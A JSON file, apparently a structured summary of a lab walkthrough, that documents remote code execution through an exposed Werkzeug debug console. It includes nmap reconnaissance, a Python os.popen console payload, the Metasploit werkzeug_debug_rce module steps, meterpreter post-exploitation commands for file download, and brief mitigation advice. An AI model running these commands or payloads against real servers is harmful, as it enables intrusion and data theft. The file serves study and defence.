@@ -1,0 +1,135 @@
+{
+  "vulnerability_info": {
+    "name": "Werkzeug Debug Console",
+    "type": "Remote Code Execution",
+    "service": "Python Web Application Framework",
+    "port": 80,
+    "severity": "Critical",
+    "cve": "Werkzeug Debug Mode"
+  },
+  "target_analysis": {
+    "reconnaissance": {
+      "tool": "nmap",
+      "command": "nmap -sV <target_ip>",
+      "findings": {
+        "port": 80,
+        "service": "Werkzeug Python web framework",
+        "version_detection": true
+      }
+    },
+    "vulnerability_discovery": {
+      "debug_console_path": "/console",
+      "condition": "Debug mode enabled",
+      "test_command": "__import__('os').popen('whoami').read()",
+      "result": "Command execution successful"
+    }
+  },
+  "exploitation": {
+    "manual_method": {
+      "access_point": "http://<target_ip>/console",
+      "payload": "__import__('os').popen('<command>').read()",
+      "description": "Direct console access for command execution"
+    },
+    "metasploit_method": {
+      "framework": "Metasploit Framework",
+      "exploit_path": "exploit/multi/http/werkzeug_debug_rce",
+      "date": "2015-06-28",
+      "setup": {
+        "use": "exploit/multi/http/werkzeug_debug_rce",
+        "set_rhosts": "<target_ip>",
+        "check": "check command for vulnerability verification",
+        "exploit": "exploit command to gain access"
+      },
+      "payload": "meterpreter",
+      "result": "Remote shell access"
+    }
+  },
+  "tools_used": {
+    "reconnaissance": [
+      {
+        "name": "nmap",
+        "purpose": "Port scanning and service detection"
+      }
+    ],
+    "exploitation": [
+      {
+        "name": "searchsploit",
+        "purpose": "Exploit database search"
+      },
+      {
+        "name": "msfconsole",
+        "purpose": "Metasploit Framework CLI",
+        "startup": "msfconsole -q"
+      }
+    ],
+    "post_exploitation": [
+      {
+        "name": "meterpreter",
+        "commands": [
+          "help - Command list",
+          "ls - List files",
+          "cd - Change directory", 
+          "cat - Read files",
+          "download - Download files",
+          "shell - System shell",
+          "sysinfo - System information"
+        ]
+      }
+    ]
+  },
+  "attack_flow": [
+    {
+      "step": 1,
+      "action": "Port scan with nmap -sV",
+      "result": "Discover Werkzeug on port 80"
+    },
+    {
+      "step": 2,
+      "action": "Access /console endpoint",
+      "result": "Confirm debug mode enabled"
+    },
+    {
+      "step": 3,
+      "action": "Test command execution",
+      "command": "__import__('os').popen('whoami').read()",
+      "result": "Command execution confirmed"
+    },
+    {
+      "step": 4,
+      "action": "Search for exploits",
+      "tools": ["searchsploit", "msfconsole search"],
+      "result": "Find Werkzeug RCE exploit"
+    },
+    {
+      "step": 5,
+      "action": "Configure and run exploit",
+      "framework": "Metasploit",
+      "result": "Gain meterpreter shell"
+    },
+    {
+      "step": 6,
+      "action": "Post-exploitation",
+      "activities": ["File system exploration", "Data extraction"],
+      "result": "Access sensitive data"
+    }
+  ],
+  "mitigation": {
+    "primary": "Disable debug mode in production",
+    "recommendations": [
+      "Set FLASK_ENV=production",
+      "Remove debug=True from application",
+      "Implement proper error handling",
+      "Use secure configuration management"
+    ]
+  },
+  "key_commands": {
+    "nmap": "nmap -sV <target>",
+    "searchsploit": "searchsploit werkzeug",
+    "msfconsole": "msfconsole -q",
+    "msf_search": "search werkzeug",
+    "msf_use": "use exploit/multi/http/werkzeug_debug_rce",
+    "msf_set": "set RHOSTS <target_ip>",
+    "msf_check": "check",
+    "msf_exploit": "exploit"
+  }
+}
